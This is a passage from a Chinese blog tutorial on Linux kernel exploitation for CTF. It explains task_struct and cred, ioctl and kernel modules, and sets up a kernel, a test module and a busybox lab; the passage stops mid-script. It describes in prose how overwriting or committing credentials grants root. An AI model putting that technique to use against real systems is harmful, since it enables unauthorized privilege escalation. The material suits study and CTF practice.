<tbody>
<tr>
<td><strong>调度相关</strong></td>
<td><code>state</code>, <code>sched_class</code></td>
<td>调度信息</td>
</tr>
<tr>
<td></td>
<td><code>prio</code>, <code>static_prio</code></td>
<td>优先级</td>
</tr>
<tr>
<td></td>
<td><code>se</code>, <code>rt_priority</code></td>
<td>调度器实体</td>
</tr>
<tr>
<td><strong>内存管理</strong></td>
<td><code>mm</code>, <code>active_mm</code></td>
<td>内存描述符</td>
</tr>
<tr>
<td></td>
<td><code>stack</code>, <code>thread_info</code></td>
<td>内核栈与线程信息</td>
</tr>
<tr>
<td><strong>标识与控制</strong></td>
<td><code>pid</code>, <code>tgid</code></td>
<td>进程与线程组 ID</td>
</tr>
<tr>
<td></td>
<td><code>real_parent</code>, <code>children</code></td>
<td>父子关系管理</td>
</tr>
<tr>
<td><strong>资源管理</strong></td>
<td><code>files</code>, <code>fs</code>, <code>signal</code></td>
<td>文件、文件系统与信号资源</td>
</tr>
<tr>
<td></td>
<td><code>cred</code>, <code>limits</code></td>
<td>权限与资源限制</td>
</tr>
<tr>
<td><strong>统计与架构相关</strong></td>
<td><code>utime</code>, <code>stime</code></td>
<td>CPU 时间</td>
</tr>
<tr>
<td></td>
<td><code>cpu_context</code>, <code>thread</code></td>
<td>上下文信息</td>
</tr>
<tr>
<td><strong>安全与调试</strong></td>
<td><code>ptrace</code>, <code>seccomp</code></td>
<td>调试与安全机制</td>
</tr>
</tbody>
</table>
<p><strong>进程权限凭证</strong>（credential）</p>
<p>结构体 <code>cred</code>
用以管理一个进程的权限，该结构体定义于内核源码
<code>include/linux/cred.h</code> 中。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="type">atomic_long_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="type">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="type">void</span>		*put_addr;</span><br><span class="line">	<span class="type">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="type">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="type">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="type">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="type">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we&#x27;re permitted */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="type">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="type">void</span>		*security;	<span class="comment">/* LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ucounts</span> *<span class="title">ucounts</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="comment">/* RCU deletion */</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="type">int</span> non_rcu;			<span class="comment">/* Can we skip RCU deletion? */</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">	&#125;;</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>
<p>我们主要关注各种id，这些字段用于定义任务的身份，并与权限检查密切相关。</p>
<ul>
<li><strong><code>kuid_t uid</code> 和 <code>kgid_t gid</code></strong>
<ul>
<li>真实用户 ID (<code>uid</code>) 和真实组 ID (<code>gid</code>)。</li>
<li>定义进程创建时的原始身份，通常由父进程继承。</li>
</ul></li>
<li><strong><code>kuid_t suid</code> 和
<code>kgid_t sgid</code></strong>
<ul>
<li>保存的用户 ID 和保存的组 ID。</li>
<li>用于暂时切换身份后恢复原始身份，常用于 SUID/SGID 程序。</li>
</ul></li>
<li><strong><code>kuid_t euid</code> 和
<code>kgid_t egid</code></strong>
<ul>
<li>有效用户 ID 和有效组 ID。</li>
<li>实际权限检查使用的身份，与真实身份不同的场景通常出现在提权操作中。</li>
</ul></li>
<li><strong><code>kuid_t fsuid</code> 和
<code>kgid_t fsgid</code></strong>
<ul>
<li>文件系统操作使用的用户 ID 和组 ID。</li>
<li>通常用于文件访问权限的检查。</li>
</ul></li>
</ul>
<p>一个进程的权限是由位于内核空间的 <code>cred</code>
结构体进行管理的，那么我们不难想到：只要改变一个进程的 <code>cred</code>
结构体，就能改变其执行权限。</p>
<p>在内核空间有如下两个函数，都位于 <code>kernel/cred.c</code> 中：</p>
<ul>
<li><code>struct cred* prepare_kernel_cred(struct task_struct* daemon)</code>：该函数用以拷贝一个进程的
cred 结构体，并返回一个新的 cred 结构体，需要注意的是 daemon
参数应为有效的进程描述符地址。如果传递的 <code>daemon</code> 参数为
<code>NULL</code>，则创建一个默认的 <code>cred</code>，通常用于与
<code>init</code> 进程（PID
1）关联的场景，较新版内核会直接返回错误。</li>
<li><code>int commit_creds(struct cred *new)</code>：该函数用以将一个新的
cred 结构体应用到进程。</li>
</ul>
<p>一般可以用<code>prepare_kernel_cred</code>先获取一个合法的cred结构体，然后更改里面的权限位后，再<code>commit_creds</code>应用到进程进行提权。但实际上在较新版的内核中，一般是直接改cred结构体，或是改task_struct的cred指针，抑或是调用<code>commit_creds(&amp;init_cred)</code>，来将具有root权限的init进程的cred结构体拷贝到我们当前进程。</p>
<h5 id="可装载内核模块"><strong>可装载内核模块</strong></h5>
<p><strong>LKMs</strong> 全称 <strong>Loadable Kernel
Modules</strong>，即<strong>可加载内核模块</strong>。它是一种可以在运行中的内核中动态加载或卸载的模块化代码。LKMs
为操作系统内核提供了灵活性，使其能够根据需要添加或移除功能，而无需重新编译或重启内核。</p>
<p>常见的 LKMs 包括：</p>
<ul>
<li>驱动程序（Device drivers）
<ul>
<li>设备驱动</li>
<li>文件系统驱动</li>
<li>...</li>
</ul></li>
<li>内核扩展模块 (modules)</li>
</ul>
<p>一般ctf题中，漏洞都是存在在<strong>.ko</strong>文件中，也就是<strong>LKM</strong>中。</p>
<p><strong>相关指令</strong></p>
<ul>
<li><strong>insmod</strong>: 讲指定模块加载到内核中</li>
<li><strong>rmmod</strong>: 从内核中卸载指定模块</li>
<li><strong>lsmod</strong>: 列出已经加载的模块</li>
<li><strong>modprobe</strong>: 添加或删除模块，modprobe
在加载模块时会查找依赖关系</li>
</ul>
<h5 id="内核交互">内核交互</h5>
<p>系统调用，指的是用户空间的程序向操作系统内核请求需要更高权限的服务，比如
IO
操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数（如
scanf，puts 等 IO 相关的函数实际上是对系统调用的封装（read 和
write））。</p>
<blockquote>
<p>在 <em>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</em> 和
<em>/usr/include/x86_64-linux-gnu/asm/unistd_32.h</em> 分别可以查看 64
位和 32 位的系统调用号。</p>
</blockquote>
<p><code>ioctl</code> 是 Linux 和类 Unix
操作系统中用于设备控制的系统调用（system call）。它全称是
<strong>Input/Output
Control</strong>，主要用于对设备执行特殊操作或者控制设备的行为，这些操作通常无法通过标准的读（<code>read</code>）、写（<code>write</code>）系统调用完成。</p>
<p><strong>基本用法</strong></p>
<p>典型的 <code>ioctl</code> 原型如下：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>fd</code></strong>:
文件描述符，表示目标设备或文件。</li>
<li><strong><code>request</code></strong>:
请求码，用于指定具体的控制操作。</li>
<li><strong><code>...</code></strong>:
可选参数，通常是指向内存中数据的指针，具体取决于请求的操作。</li>
</ul>
<p><strong>常见用途</strong></p>
<ol type="1">
<li><strong>设备配置</strong>：设置设备参数（例如网络设备的 IP
地址、串口波特率）。</li>
<li><strong>信息查询</strong>：获取设备的状态、硬件信息等。</li>
<li><strong>非标准 I/O 操作</strong>：执行驱动中特殊的读写行为。</li>
<li><strong>硬件控制</strong>：控制底层硬件设备，例如磁盘分区管理。</li>
</ol>
<p><strong>示例代码</strong></p>
<p>一个简单的例子是设置终端属性：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termios</span> <span class="title">term</span>;</span></span><br><span class="line">    <span class="type">int</span> fd = <span class="number">0</span>; <span class="comment">// 通常 0 表示标准输入（终端）</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, TCGETS, &amp;term) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;ioctl error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;终端配置已成功获取\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><code>TCGETS</code></strong>: 获取终端的当前配置。</li>
<li><strong><code>struct termios</code></strong>:
存储终端配置的结构体。</li>
</ul>
<p><strong>请求码的构造</strong></p>
<p><code>ioctl</code> 请求码通常用四部分组成：</p>
<ul>
<li><strong>类型</strong>：表示设备类型，例如磁盘、终端。</li>
<li><strong>编号</strong>：特定命令的编号。</li>
<li><strong>方向</strong>：表示是读、写还是两者皆有。</li>
<li><strong>大小</strong>：与之交互的数据大小。</li>
</ul>
<p>宏 <strong><code>_IO</code>、<code>_IOR</code>、<code>_IOW</code> 和
<code>_IOWR</code></strong> 常被用于生成请求码。</p>
<ul>
<li><code>_IO</code>：无数据传输。</li>
<li><code>_IOR</code>：数据从内核传输到用户空间（读）。</li>
<li><code>_IOW</code>：数据从用户空间传输到内核（写）。</li>
<li><code>_IOWR</code>：双向传输（读写）。</li>
</ul>
<p><strong>注意事项</strong></p>
<ol type="1">
<li><strong>设备驱动依赖</strong>：<code>ioctl</code>
的功能完全由设备驱动程序实现，不同设备可能有不同的控制请求。</li>
<li><strong>安全性问题</strong>：由于 <code>ioctl</code>
可以直接操作设备，对参数的检查不足可能会带来漏洞，尤其是在权限提升攻击中。</li>
</ol>
<h4 id="环境搭建">环境搭建</h4>
<h5 id="下载内核">下载内核</h5>
<p><a class="link" 
 target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/kernel/" >清华源镜像站<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>下列步骤如果确信来源可靠的话，可以略过中间签名验证的三步。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.xz		<span class="comment">#可以选择自己想要的对应版本</span></span><br><span class="line">unxz linux-5.4.98.tar.xz	<span class="comment">#解压</span></span><br><span class="line">curl -O -L https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.15.153.tar.sign	<span class="comment">#下载签名</span></span><br><span class="line">gpg --locate-keys gregkh@kernel.org		<span class="comment">#导入内核版本发布者的公钥。</span></span><br><span class="line">gpg --verify linux-5.15.153.tar.sign		<span class="comment">#验证签名</span></span><br><span class="line">tar -xf linux-5.15.153.tar		<span class="comment">#解压得到源码</span></span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250112233721560.png"
                      class=""
                >
<p>然后配置内核的编译选项，可以用menuconfig来可视化配置。如果想要非交互式，直接调整
<code>.config</code> 文件或使用以下命令生成默认配置：</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#默认配置</span></span><br><span class="line">make defconfig</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#可视化自定义配置</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install libncurses-dev</span><br><span class="line"><span class="built_in">sudo</span> apt install flex</span><br><span class="line">make menuconfig</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113003141550.png"
                      class=""
                >
<p>这里我们主要关注调试方面的选项，依次进入到 Kernel hacking -&gt;
Compile-time checks and compiler
options，然后勾选如下选项<code>Compile the kernel with debug info</code>，以便于调试。</p>
<p>如果要使用 kgdb 调试内核，则需要选中
<code>KGDB: kernel debugger</code>，并选中 KGDB
下的所有选项。这里我试了下，linux-5.4.98这个版本有KGDB选项，而linux-5.15.153这个版本就没这个选项了，据说是默认开启。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004218124.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113004304194.png"
                      class=""
                >
<h5 id="编译内核">编译内核</h5>
<p>编译内核前需要准备一些工具。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt install build-essential libncurses-dev bison flex libssl-dev libelf-dev bc</span><br></pre></td></tr></table></figure></div>
<p>编译内核镜像，可以根据机器的核数来选择具体使用多少核来编译内核。这里我们将标准错误重定向到日志中看看。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">nproc</span>		<span class="comment">#查看自己主机有多少核</span></span><br><span class="line">make -j$(<span class="built_in">nproc</span>) bzImage 2&gt; build_error.log		<span class="comment">#-jn就是指定用n核进行并行编译，直接指定为nproc全速运行进行编译</span></span><br></pre></td></tr></table></figure></div>
<p>编译时我遇到了以下错误：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">make[<span class="number">2</span>]: *** No rule to make target <span class="string">&#x27;net/netfilter/xt_TCPMSS.o&#x27;</span>, needed by <span class="string">&#x27;net/netfilter/built-in.a&#x27;</span>.  Stop.</span><br><span class="line">make[<span class="number">2</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make[<span class="number">1</span>]: *** [scripts/Makefile.build:<span class="number">552</span>: net/netfilter] Error <span class="number">2</span></span><br><span class="line">make[<span class="number">1</span>]: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br><span class="line">make: *** [Makefile:<span class="number">1907</span>: net] Error <span class="number">2</span></span><br><span class="line">make: *** Waiting <span class="keyword">for</span> unfinished jobs....</span><br></pre></td></tr></table></figure></div>
<p>根据https://bbs.t-firefly.com/forum.php?mod=viewthread&amp;tid=1826这篇求助帖，发现问题大概是我们的文件系统大小写敏感，而<code>net/netfilter/</code>目录下只有<code>xt_tcpmss.c</code>这个文件。这里我们把其改名为<code>xt_TCPMSS.c</code>试试。然后最后出现如下提示，则编译成功。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113223946647.png"
                      class=""
                >
<h5 id="编译内核驱动">编译内核驱动</h5>
<h6 id="编写代码">编写代码</h6>
<p>这里我们以自己编译一个输出Hello World的内核驱动模块为例。</p>
<p>因为我所用的环境是vscode，而windows上的环境没有几个内核的头文件，所以我们要配置wsl远程开发。</p>
<p>安装 WSL 后：</p>
<ol type="1">
<li>在 VSCode 中安装 <a class="link" 
 target="_blank" rel="noopener" href="https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-wsl" >Remote
- WSL<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 插件。</li>
<li>点击 VSCode 左下角绿色的“打开远程窗口”图标，选择 “WSL: New
Window”，进入到 WSL 环境的文件系统。</li>
<li>确保在 WSL 中设置好文件路径共享，通过 <code>/mnt/c</code> 可直接访问
Windows 文件。</li>
</ol>
<p>在 WSL 中，可以直接开发和测试内核模块。具体代码实现如下。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//myko.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">//包含与内核相关的基本功能和工具，比如 printk 函数，用于向内核日志打印消息。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">//定义了 module_init 和 module_exit 宏，这些用于指定模块的入口和退出函数。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">//包含定义 Linux 内核模块所需的基础结构，例如 MODULE_LICENSE 宏。</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//声明模块的许可证。内核需要知道你的模块是开源的还是闭源的。这里说明可以用 BSD 或 GPL 任一许可证。</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);	</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">my_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Hello, world!\n&quot;</span>);		<span class="comment">//类似于用户态的 printf，但它打印的信息会进入内核日志而不是终端。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">my_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(<span class="string">&quot;Goodbye, cruel world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(my_init);		<span class="comment">//注册模块的初始化函数，告诉内核加载模块时应调用 my_init。</span></span><br><span class="line">module_exit(my_exit);		<span class="comment">//注册模块的清理函数，告诉内核卸载模块时应调用 my_exit。</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h6 id="加载模块">加载模块</h6>
<p>先创建Makefile以便编译我们写好的内核驱动模块。</p>
<div class="highlight-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">obj-m := myko.o</span><br><span class="line"></span><br><span class="line">KERNELDR := /mnt/e/ctf/kernel/linux-5.15.153</span><br><span class="line"></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"></span><br><span class="line"><span class="section">modules:  </span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">moduels_install:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules_install</span><br><span class="line"></span><br><span class="line"><span class="section">clean:  </span></span><br><span class="line">	rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions</span><br></pre></td></tr></table></figure></div>
<p><code>obj-m</code>:</p>
<p>指定需要编译的模块目标文件，这里是 <code>myko.ko</code>，源文件为
<code>myko.c</code>。</p>
<p><code>KERNELDR</code>:</p>
<p>定义内核源码路径，需要提供一个完整内核源码树。此目录必须配置了编译环境和内核头文件。</p>
<p><code>PWD</code>:</p>
<p>当前模块源代码的路径（<code>pwd</code>
命令的输出），在编译内核模块时会作为参数传递给内核构建系统。</p>
<p><code>modules</code>:</p>
<p>调用内核的构建系统，执行模块编译。</p>
<ul>
<li><code>-C $(KERNELDR)</code>: 切换到内核源码目录并使用它的
Makefile。</li>
<li><code>M=$(PWD)</code>:
指定模块代码所在的目录，内核会到这里查找模块代码并编译。</li>
</ul>
<p><code>modules_install</code>:
安装编译完成的模块（<code>myko.ko</code>）到系统指定的模块目录（通常是
<code>/lib/modules/$(uname -r)/</code>）。</p>
<p><code>clean</code>:
清除临时文件、编译生成的中间文件（<code>.o</code>、<code>.ko</code>、<code>.mod.c</code>
等）。</p>
<p>然后在终端make即可获取到myko.ko。可能会遇到以下错误：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230522662.png"
                      class=""
                >
<p>可以先在我们编译好的kernel目录下执行<code>make modules_prepare</code>重新加载符号表。然后就只会报warning而不会直接Error退出。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/02/22/kernel-pwn%E5%88%9D%E6%8E%A2/image-20250113230655614.png"
                      class=""
                >
<p>这里还是缺少符号文件。我们先忽略。</p>
<p>然后我们想要通过已经编译好的内核，起一个虚拟环境，以测试自己写好的模块。首先我们安装BusyBox以快速新建一个根文件系统。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install busybox</span><br></pre></td></tr></table></figure></div>
<p>然后按以下方式新建根文件系统，用的是busybox。将一些常用指令创建链接到busybox，busybox会根据指令类型自动执行对应指令。</p>
<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建文件结构</span></span><br><span class="line"><span class="built_in">mkdir</span> -p bin dev etc lib proc sys tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装 busybox</span></span><br><span class="line"><span class="built_in">cp</span> $(<span class="built_in">which</span> busybox) ./bin</span><br><span class="line"><span class="built_in">cd</span> bin</span><br><span class="line"><span class="built_in">ln</span> -s busybox sh</span><br><span class="line"><span class="built_in">ln</span> -s busybox init</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建简单的 init 脚本</span></span><br><span class="line"><span class="built_in">cat</span> &gt; init &lt;&lt; <span class="string">EOF</span></span><br><span 